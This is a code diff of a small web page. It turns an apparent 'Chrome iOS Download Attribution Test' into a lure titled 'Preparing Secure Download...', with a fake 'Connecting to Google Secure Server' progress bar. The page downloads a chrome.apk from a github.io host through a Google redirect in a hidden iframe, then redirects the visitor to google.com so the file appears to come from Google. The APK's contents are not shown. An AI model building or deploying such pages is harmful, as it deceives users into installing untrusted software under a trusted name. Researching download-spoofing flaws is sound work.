@@ -4,40 +4,70 @@
 <meta charset="utf-8">
 
 <style>
+
 body{
-  font-family:Arial;
-  text-align:center;
-  margin-top:120px;
+font-family:Arial;
+text-align:center;
+margin-top:120px;
 }
 
 .button{
-  background:#4CAF50;
-  border:none;
-  color:white;
-  padding:16px 36px;
-  font-size:18px;
-  cursor:pointer;
+background:#4CAF50;
+border:none;
+color:white;
+padding:16px 36px;
+font-size:18px;
+cursor:pointer;
+}
+
+#loader{
+display:none;
+margin-top:40px;
+}
+
+#progress{
+width:300px;
+height:20px;
+border:1px solid #ccc;
+margin:auto;
+}
+
+#bar{
+width:0%;
+height:100%;
+background:#4CAF50;
 }
 
 #frame{
-  display:none;
-  width:0;
-  height:0;
-  border:0;
+display:none;
+width:0;
+height:0;
+border:0;
 }
+
 </style>
 
 </head>
 
 <body>
 
-<h2>Chrome iOS Download Attribution Test</h2>
+<h2>Preparing Secure Download...</h2>
 
 <br>
 
 <button class="button" onclick="startTest()">
-Click here
+Download From Original Site
 </button>
+
+<div id="loader">
+
+<p>Connecting to Google Secure Server...</p>
+
+<div id="progress">
+<div id="bar"></div>
+</div>
+
+</div>
 
 <iframe id="frame"></iframe>
 
@@ -45,23 +75,33 @@ Click here
 
 function startTest(){
 
-  const frame=document.getElementById("frame");
+document.getElementById("loader").style.display="block";
 
-  // URL google redirect → file asli
-  const downloadURL="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk";
+let bar=document.getElementById("bar");
+let width=0;
 
-  // trigger download lewat iframe
-  frame.src=downloadURL;
+const downloadURL="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk";
 
-  // tampilkan iframe setelah beberapa detik
-  setTimeout(()=>{
-    frame.style.display="block";
-  },3500);
+document.getElementById("frame").src=downloadURL;
 
-  // redirect cepat
-  setTimeout(()=>{
-    window.location.href="https://google.com";
-  },220);
+let interval=setInterval(function(){
+
+if(width>=100){
+
+clearInterval(interval);
+
+window.location.href="https://google.com";
+
+}
+
+else{
+
+width+=5;
+bar.style.width=width+"%";
+
+}
+
+},120);
 
 }
 
